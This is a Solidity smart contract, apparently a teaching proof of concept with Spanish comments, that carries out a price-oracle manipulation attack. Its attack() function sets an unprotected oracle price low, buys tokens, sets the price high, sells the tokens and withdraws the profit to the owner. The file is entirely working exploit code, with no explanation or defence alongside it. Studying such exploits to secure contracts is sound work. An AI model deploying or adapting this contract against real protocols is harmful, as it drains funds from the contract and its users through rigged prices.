// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPriceOracle {
    function setPrice(uint price) external;
}

interface IOracleManipulation {
    function buyTokens() external payable;
    function sellTokens(uint amount) external;
}

interface IERC20 {
    function approve(address spender, uint amount) external returns (bool);
    function balanceOf(address user) external view returns (uint);
}

contract PriceOracleManipulationAttack {
    // Variables
    IOracleManipulation public target;
    IPriceOracle public oracle;
    IERC20 public token;
    address public owner;

    // Constructor
    constructor(address _target, address _oracle, address _token) {
        target = IOracleManipulation(_target);
        oracle = IPriceOracle(_oracle);
        token = IERC20(_token);
        owner = msg.sender;
    }

    //Funcion de ataque
    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value > 0, "Send ETH to start");

        // 1. Manipular el precio para bajarlo
        oracle.setPrice(1 ether); // 1 USD por token

        // 2. Comprar tokens
        target.buyTokens{value: msg.value}();

        // 3. Manipular el precio para subirlo
        oracle.setPrice(10 ether); // 10 USD por token

        // 4. Vender tokens
        uint256 balance = token.balanceOf(address(this));
        token.approve(address(target), balance);
        target.sellTokens(balance);

        // 5. Retirar creditos
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
